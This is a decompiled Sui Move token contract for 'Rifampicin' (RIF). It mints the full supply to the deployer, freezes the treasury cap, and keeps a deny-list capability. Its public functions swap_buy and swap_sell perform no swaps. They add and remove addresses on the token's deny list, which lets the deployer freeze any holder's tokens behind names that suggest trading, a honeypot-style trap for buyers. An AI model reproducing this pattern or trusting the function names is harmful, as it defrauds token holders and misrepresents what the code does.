module 0x28e0a5c18094b6697473de23ca92a2c0f8a8a800f0fd906fff22f89edf79f09b::rif {
    struct RIF has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: RIF, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<RIF>(arg0, 9, b"RIF", b"Rifampicin", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmWhxjoSpGKFW3ruyZ3YNVGwW5uooqbccGNpMr82Eeqq8U"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<RIF>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<RIF>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<RIF>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<RIF>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<RIF>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<RIF>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<RIF>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<RIF>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

